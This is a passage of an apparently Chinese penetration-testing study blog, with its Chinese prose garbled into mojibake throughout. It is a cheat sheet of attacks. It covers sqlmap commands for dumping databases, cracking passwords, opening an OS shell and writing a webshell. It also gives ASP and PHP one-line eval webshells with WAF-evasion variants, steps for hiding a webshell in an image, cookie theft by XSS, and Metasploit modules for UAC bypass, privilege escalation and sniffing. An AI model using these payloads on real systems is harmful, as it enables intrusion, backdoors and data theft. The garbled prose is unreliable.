<h4 id="sqlmap-ï¼ˆæœ‰æ—¶å€™-sqlmap-ä¸èƒ½æ‰§è¡Œå‘½ä»¤ä½†æ˜¯ç©¿å±±ç”²å¯ä»¥ï¼‰"><a href="#sqlmap-ï¼ˆæœ‰æ—¶å€™-sqlmap-ä¸èƒ½æ‰§è¡Œå‘½ä»¤ä½†æ˜¯ç©¿å±±ç”²å¯ä»¥ï¼‰" class="headerlink" title="sqlmap ï¼ˆæœ‰æ—¶å€™ sqlmap ä¸èƒ½æ‰§è¡Œå‘½ä»¤ä½†æ˜¯ç©¿å±±ç”²å¯ä»¥ï¼‰"></a>sqlmap ï¼ˆæœ‰æ—¶å€™ sqlmap ä¸èƒ½æ‰§è¡Œå‘½ä»¤ä½†æ˜¯ç©¿å±±ç”²å¯ä»¥ï¼‰</h4><ul>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“is-dba çœ‹æ˜¯å¦æ˜¯ dba æƒé™</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“current-user çœ‹çœ‹å½“å‰ç”¨æˆ·åç§°</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“privileges æŸ¥çœ‹ç”¨æˆ·</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“password å°è¯•çˆ†ç ´å¯†ç </li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“os-shell æ‰“å¼€xp_cmdshell</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“dbs ç®¡ç†å‘˜å¯ä»¥ç›´æ¥åˆ—æ•°æ®åº“</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“current-db æŸ¥è¯¢å½“å‰æ•°æ®åº“</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“tables -D test â€“count</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“columns -T admin -D test</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ â€“dump -C a -T admin -D test</li>
<li>sqlmap -u â€œæ³¨å…¥ç‚¹â€ echo ^&lt;%eval request(â€œmumaâ€);%^&gt; &gt;  c:\wwwroot\a.asp å†™ä¸€å¥è¯</li>
</ul>
<p>å¦‚æœå¯¹æ–¹æœ‰é˜²è¿‡æ»¤çš„ä»£ç ï¼Œå¯ä»¥ç”¨ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š</p>
<p>ç”¨ /**/ æˆ– + æˆ– %0a ä»£æ›¿ç©ºæ ¼ï¼Œæˆ–è€…å°è¯•ç”¨å¤§å°å†™</p>
<h2 id="Mysql-æ³¨å…¥"><a href="#Mysql-æ³¨å…¥" class="headerlink" title="Mysql æ³¨å…¥"></a>Mysql æ³¨å…¥</h2><h3 id="å¯èƒ½ç”¨åˆ°çš„æŸ¥è¯¢å‡½æ•°"><a href="#å¯èƒ½ç”¨åˆ°çš„æŸ¥è¯¢å‡½æ•°" class="headerlink" title="å¯èƒ½ç”¨åˆ°çš„æŸ¥è¯¢å‡½æ•°"></a>å¯èƒ½ç”¨åˆ°çš„æŸ¥è¯¢å‡½æ•°</h3><ul>
<li>system_user() ç³»ç»Ÿç”¨æˆ·å</li>
<li>user() ç”¨æˆ·å</li>
<li>current_user() å½“å‰ç”¨æˆ·å</li>
<li>session_user() è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å</li>
<li>database() æ•°æ®åº“å</li>
<li>version() æ•°æ®åº“ç‰ˆæœ¬</li>
<li>load_file(â€˜c:/123.txtâ€™) è½¬æˆ16è¿›åˆ¶æˆ–è€…10è¿›åˆ¶ï¼Œmysql è¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•°</li>
<li>@@datadir è¯»å–æ•°æ®åº“è·¯å¾„</li>
<li>@@basedir mysqlå®‰è£…è·¯å¾„ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªæ¥æ¨æµ‹ç½‘ç«™çš„æ ¹ç›®å½•</li>
<li>@@version_compile_os æ“ä½œç³»ç»Ÿ</li>
<li></li>
</ul>
<h2 id="è„šæœ¬æœ¨é©¬"><a href="#è„šæœ¬æœ¨é©¬" class="headerlink" title="è„šæœ¬æœ¨é©¬"></a>è„šæœ¬æœ¨é©¬</h2><ul>
<li>ä¸€å¥è¯æœ¨é©¬</li>
<li>å°é©¬</li>
<li>å¤§é©¬</li>
<li>æ‰“åŒ…é©¬</li>
<li>æ‹–åº“é©¬</li>
<li>ç­‰ç­‰</li>
</ul>
<h3 id="ä¸€å¥è¯æœ¨é©¬ï¼š"><a href="#ä¸€å¥è¯æœ¨é©¬ï¼š" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬ï¼š"></a>ä¸€å¥è¯æœ¨é©¬ï¼š</h3><p>&lt;%execute request(â€œvalueâ€)%&gt;</p>
<p>æŠŠå®¢æˆ·ç«¯æäº¤çš„æ•°æ®å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œã€‚request æ˜¯å®šä¹‰ä¼ è¾“æ–¹å¼çš„ã€‚</p>
<p>cracer.com/x.asp?value=whoami</p>
<p>waf ä¸€èˆ¬æ‹¦æˆªçš„æ˜¯è¯·æ±‚æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚</p>
<ul>
<li><p>asp</p>
<p>&lt;%eval requset(c)%&gt;</p>
</li>
<li><p>php</p>
<?php @eval($_POST['sb']);?>

</li>
</ul>
<p><strong>å˜å½¢ï¼Œç»• waf</strong></p>
<ul>
<li><p>php</p>
<?php $_REQUEST['a']($_REQUEST['b']);?>

<p>åŠ¨æ€ä¼ å‚ï¼Œèœåˆ€è¿æ¥æ—¶ URL å¯æ”¹ä¸ºï¼š127.0.0.1/a.php?a=eval&amp;b=phpinfo;ï¼ŒæŠŠ eval ä¼ ç»™ aï¼Œä½†ç°åœ¨æ²¡æœ‰åŠæ³•ç»•è¿‡äº†ã€‚</p>
</li>
<li><p>&lt;%Eval(Request(chr(112)))%&gt;</p>
<p>value æ”¹ä¸º ASCII ç ï¼Œè¿™æ ·å°±ä¸éœ€è¦å†™å•å¼•å·æˆ–åŒå¼•å·äº†ã€‚</p>
</li>
<li><p>&lt;%Eval(Request(chr(112)+chr(114)+chr(117)))%&gt;</p>
<p>å¤šä¸ªå­—æ¯ã€‚</p>
</li>
</ul>
<p><strong>ä¸€å¥è¯å›¾ç‰‡é©¬çš„åˆ¶ä½œ</strong></p>
<ul>
<li>c32 ç”¨åå…­è¿›åˆ¶æ‰“å¼€ï¼ˆhexï¼‰</li>
<li>å›¾ç‰‡æ‹–è¿›å»</li>
<li>åœ¨æœ€åæŠŠä¸€å¥è¯å¤åˆ¶è¿›å»</li>
<li>ä¿å­˜ï¼Œç„¶åä¸Šä¼ åˆ° web ä¸­</li>
<li>æƒ³åŠæ³•è§£ææˆè„šæœ¬æ–‡ä»¶æ ¼å¼</li>
<li>èœåˆ€è¿æ¥ï¼Œæˆ–è€…åˆ©ç”¨æ–‡ä»¶åŒ…å«</li>
</ul>
<p><strong>Windows ä¿®æ”¹ç›®å½•æƒé™</strong></p>
<p>ç”¨ cacls å‘½ä»¤ä¿®æ”¹æ–‡ä»¶å¤¹æƒé™ç­‰</p>
<p>ä¸Šä¼  cmd.exeï¼Œåˆ©ç”¨ setp å‘½ä»¤æ¥è¿›è¡Œè°ƒç”¨ï¼Œä½†å¿…é¡»è¦æœ‰æƒé™ã€‚</p>
<p><strong>é»‘åƒé»‘</strong></p>
<p>webshell åé—¨ï¼ŒF12 çœ‹ç½‘ç»œæ¨¡å—ï¼Œä¼šå°†è¯·æ±‚ä¼ é€’åˆ°æŸä¸ªåœ°å€ï¼Œæ¯è¯·æ±‚ä¸€æ¬¡å°±ä¼šå‘é€ä¸€æ¬¡ã€‚è¿™é‡Œå°†å‘é€çš„ä¸€éƒ¨åˆ†æ”¹ä¸º xss payload ç›—å– cookieï¼ˆåˆ©ç”¨ xss å¹³å°ç­‰ï¼‰ï¼Œç„¶åç”¨å·¥å…·ï¼Œæ¯”å¦‚é©¬å“¥ï¼Œæ¥é»‘åƒé»‘ã€‚</p>
<h2 id="åæ¸—é€é˜¶æ®µ"><a href="#åæ¸—é€é˜¶æ®µ" class="headerlink" title="åæ¸—é€é˜¶æ®µ"></a>åæ¸—é€é˜¶æ®µ</h2><ul>
<li>æƒé™æå‡ï¼šææƒå‡ ç§æ–¹å¼</li>
<li>ä¿¡æ¯æ”¶é›†ï¼šæœåŠ¡å™¨ä¿¡æ¯ã€Hashã€é˜²ç«å¢™æ€æ¯’è½¯ä»¶ã€è´¦å·å¯†ç </li>
<li>å†…ç½‘æ¸—é€ï¼šç«¯å£è½¬å‘ã€ä»£ç†è·³æ¿</li>
<li>åé—¨æ¤å…¥ï¼šæ°¸ä¹…åé—¨ç»´æŒæƒé™</li>
</ul>
<ol>
<li><p>æƒé™æå‡</p>
<ul>
<li><p>æé«˜ç¨‹åºè¿è¡Œçº§åˆ«</p>
<p>msf æ¨¡å—</p>
<p>exploit/windows/local/ask</p>
</li>
<li><p>UAC ç»•è¿‡</p>
<p>Â· exploit/windows/local/bypassuac</p>
<p>Â· exploit/windows/local/bypassuac_injection</p>
<p>Â· exploit/windows/local/bypassuac_vbs</p>
</li>
<li><p>åˆ©ç”¨ææƒæ¼æ´æ¥ææƒ</p>
<p>Â· exploit/windows/local/ms14_058_track_popup_menu</p>
<p>test on Windows XP</p>
<p>Â· exploit/windows/local/ms16_016_webdav</p>
<p>win 7 å†…æ ¸ææƒæ¼æ´</p>
</li>
</ul>
</li>
<li><p>ä¿¡æ¯æ”¶é›†</p>
<p>meterpreter&gt; æ­¤ session æ˜¯é«˜æƒé™</p>
<ul>
<li><p>è·å–ç›®æ ‡æœºå™¨çš„åˆ†åŒºæƒ…å†µ</p>
<p>run post/windows/gather/forensics/enum_drives</p>
</li>
<li><p>åˆ¤æ–­æ˜¯å¦æ˜¯è™šæ‹Ÿæœº</p>
<p>run post/windows/gather/checkvm</p>
</li>
<li><p>è·å–è¿è¡Œçš„æœåŠ¡ï¼ˆåŒ…æ‹¬æƒé™ã€è·¯å¾„ç­‰ï¼‰</p>
<p>run post/windows/gather/enum_services</p>
</li>
<li><p>å®‰è£…äº†å“ªäº›åº”ç”¨</p>
<p>run post/windows/gather/enum_applications</p>
</li>
<li><p>åº”ç”¨äº†å“ªäº›å…±äº«</p>
<p>run post/windows/gather/enum_shares</p>
</li>
<li><p>åˆ—å‡ºä¸»æœºæœ€è¿‘çš„ä¸€äº›æ“ä½œ</p>
<p>run post/windows/gather/dumplinks</p>
</li>
<li><p>æŸ¥çœ‹ä¸»æœºæ˜¯å¦å®‰è£…è¡¥ä¸ï¼Œå¯¹åº”æ¼æ´ç¼–å·ç­‰</p>
<p>run post/windows/gather/enum_patches</p>
</li>
<li><p>åˆ©ç”¨è„šæœ¬è·å–è¯¦ç»†ä¿¡æ¯</p>
<p>Â· run scraper</p>
<p>ç„¶åè¿›å…¥ ~/.msf4/logs/scripts/scraper ä¸­æœ‰ä¿å­˜æ–‡ä»¶ï¼Œå¦‚æœæ˜¾ç¤ºä¹±ç å°±å…ˆæ›´æ”¹ä¸€ä¸‹ç¼–ç æ–¹å¼ã€‚</p>
<p>Â· run winenum</p>
<p>ä¿å­˜ä½ç½®ï¼š~/.msf4/logs/scripts/winenum</p>
</li>
</ul>
</li>
<li><p>æ•°æ®åŒ…æ•è·</p>
<p><strong>æŠ“åŒ…ä¸è§£åŒ…ï¼š</strong>è·å–ç½‘ç»œä¸­æ•°æ®çš„äº¤äº’</p>
<p>æŠ“åŒ…</p>
<ul>
<li>åŠ è½½ sniffer: load sniffer</li>
<li>æŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼šsniffer_interface</li>
<li>å¼€å¯ç›‘å¬ï¼šsniffer_start 1</li>
<li>å¯¼å‡ºæ•°æ®åŒ…ï¼šsniffer_dump 1 1.cap</li>
</ul>
<p>è§£åŒ…</p>
<ul>
<li>auxiliary/sniffer/psnu</li>
</ul>
</li>
</ol>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck71os4fd000u5kozumoykqlo" data-title="ğŸ¼ Study [æŒç»­æ›´æ–°]" data-url="http://www.naykcin.top/2018/04/05/study/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2018/12/31/SQL/"><i class="icon icon-arror-left"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>